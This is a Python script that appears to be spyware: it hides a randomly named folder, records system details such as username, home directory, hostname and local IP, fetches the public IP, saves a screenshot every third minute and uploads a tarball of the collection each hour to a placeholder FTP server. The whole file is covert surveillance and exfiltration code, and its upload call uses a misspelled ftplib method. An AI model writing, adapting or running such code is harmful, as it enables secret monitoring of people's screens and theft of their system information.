from requests import get
from datetime import datetime
from PIL import ImageGrab
from pathlib import Path
from time import sleep
import os, platform, secrets, socket
import tarfile, ftplib, gc

print("[>] Starting...")

# Prepare Main::
print("[>] Preparing dirs.")
hidden_dir = ".{0}".format(secrets.token_hex(16))
path = os.path.join(os.getcwd(), hidden_dir)
os.mkdir(path)
# Prepare Img:
img_dir = ".img"
img_path = os.path.join(path, img_dir)
os.mkdir(img_path)

# OS Recon:
print("[>] Dumping info.")
with open("{0}/.Info.txt".format(path), "w") as fl:
    fl.write("System: {0}\n".format(platform.system()))
    fl.write("Arch: {0} {1}\n".format(platform.machine(), platform.architecture()[0]))
    fl.write("Username: {0}\n".format(platform.os.getlogin()))
    fl.write("Home: {0}\n".format(str(Path.home())))
    try:
        fl.write("Node: {0} - {1}\n".format(platform.node(), socket.gethostbyname(socket.gethostname())))
    except:
        pass

# Tar.file:
tarname = "{0}_{1}.tar.gz".format(get('https://api.ipify.org').text, datetime.now().timestamp())
def send_tar():
    # Make Tar:
    tar = tarfile.open(tarname, "w:gz")
    tar.add(path, arcname=tarname)
    tar.close()
    # Send Tar:
    payload = open(tarname, "rb")
    session = ftplib.FTP("ftp.server.com", "username", "password")
    session.stopbinary(tarname, payload)
    session.quit()
    payload.close()


# Take Screenshot:
print("[*] Waiting for prints.")
hour = datetime.now().hour
while True:
    if hour != datetime.now().hour:
        print("[!] Sending file!")
        hour = datetime.now().hour
        send_tar()
        continue
    else:
        if datetime.now().minute % 3 == 0:
            print("[+] Taking screenshot!")
            img_name = datetime.now().timestamp()
            ImageGrab.grab().save("{0}/.{1}.jpg".format(img_path, img_name), "JPEG")
    sleep(60)
